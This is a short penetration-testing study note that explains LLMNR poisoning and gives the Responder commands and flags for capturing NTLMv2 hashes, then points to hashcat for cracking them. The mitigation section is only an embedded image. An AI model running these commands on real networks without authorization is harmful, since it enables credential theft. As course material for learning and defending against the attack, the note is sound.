---
tags:
  - PEH
---
## What is LLMNR Poisoning?
LLMNR stands for Link Local Multicast Name Resolution, LLMNR is a protocol that is used to identify hosts when DNS fails to do so.

This attack happens when the victim asks for a share folder that doesn't exist in the network (for example: the victim is looking for \\\\hackme, but the victim accidentally wrote \\\\hacke instead), the server will respond with a negative response. Afterwards the victim will send a broadcast asking for the share folder, the hacker claims that he knows the share folder and asks for the victim's hash. If the hash is weak enough it will be cracked by the hacker:
![[LLMNR Poisoning.png]]
>[!info] Share folder is just one example!
>Usually traffic of this type FLIES over the network if LLMNR is enabled, and the share folder is just one example!
## Capturing hashes with responder and cracking them
### Capturing hashes with responder
Steps of the attack:
0. Make sure to turn both of SMB and HTTP ON
1. Run responder and listen for traffic
```bash
sudo responder -I <interface> -dwv
sudo responder -I <interface> -dPv

# Flags:
# -I is for the itnerface (tun0 is for a vpn tunnel)
# -d is enabled to respond for DHCP
# -w Starts rogue wpad proxy server, which allows browswer to locate proxy servers without any additional configuration
# -P Force NTLM (Network Lan Manager) authentication
```
2. Capture events that occur
3. Get the hash (==Hashes captured are of type NTLMv2==)
4. Crack it using any tool, `hashcat` for example
### Cracking captured hashes
Cracking captured hashes is [[Password cracking| password cracking]], so review the hashcat section:
![[Password cracking#hashcat]]
## LLMNR Poisoning mitigation
![[LLMNR Poisoning mitigation.png]]